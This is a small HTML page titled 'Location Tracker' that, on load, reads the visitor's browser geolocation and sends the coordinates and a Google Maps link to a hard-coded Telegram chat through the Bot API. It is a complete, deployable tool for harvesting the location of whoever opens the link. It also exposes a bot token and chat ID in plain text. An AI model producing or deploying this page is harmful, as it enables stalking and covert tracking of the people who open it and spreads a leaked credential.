<!DOCTYPE html>
<html>
  <head>
    <title>Location Tracker</title>
    <script>
      function sendLocation() {
        if ("geolocation" in navigator) {
          navigator.geolocation.getCurrentPosition(function(position) {
            let lat = position.coords.latitude;
            let lon = position.coords.longitude;

            // Telegram Bot details
            let botToken = "7756919890:AAFeaK4TYe5ruR90Fl-0EimZz-RSandHO94";
            let chatId = "5242590049";
            let message = `üìç New Location:\nLatitude: ${lat}\nLongitude: ${lon}\nGoogle Maps: https://maps.google.com/?q=${lat},${lon}`;

            let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            fetch(url)
              .then(response => {
                alert("‚úÖ Location sent successfully!");
              })
              .catch(error => {
                alert("‚ùå Failed to send location.");
              });
          }, function(error) {
            alert("‚ùå Error getting location: " + error.message);
          });
        } else {
          alert("‚ùå Geolocation not supported.");
        }
      }

      window.onload = sendLocation;
    </script>
  </head>
  <body>
    <h2>üì° Sending your location, please wait...</h2>
  </body>
</html>
